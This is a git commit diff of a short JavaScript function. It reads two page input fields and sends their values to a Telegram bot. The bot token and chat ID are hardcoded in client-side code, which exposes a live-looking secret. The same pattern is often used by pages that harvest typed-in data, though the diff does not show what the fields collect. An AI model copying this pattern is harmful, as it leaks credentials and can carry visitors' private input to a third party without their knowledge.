f56bc60acb1bcc878a2b5dfe0eed8009897e6154
JONIBEK <pubgkir40@gmail.com>
2026-08-14 22:17:03 +0500

    O'zgarishlar qo'shildi

--- main.js
+++ main.js
@@ -1,21 +1,17 @@
+// main.js
 function send() {
-        let text = document.getElementById("inputtext").value;
-  
-    // 🔑 BOT TOKEN
-    let TOKEN = "8628807064:AAH6SXYouihXiAujY-SE9UaMxyRUI-gsgK4";
+    let a = document.getElementById("input1").value;
+    let b = document.getElementById("input2").value;
 
-    // 🆔 TELEGRAM ID
+    let TOKEN = "8628807064:AAH6SXYouihXiAujY-SE9UaMxyRUI-gsgK4";
     let CHAT_ID = "-1004300839212";
 
     fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
+        headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: text
+            text: `Jonibek\n1: ${a}\n2: ${b}`
         })
     });
 }
-
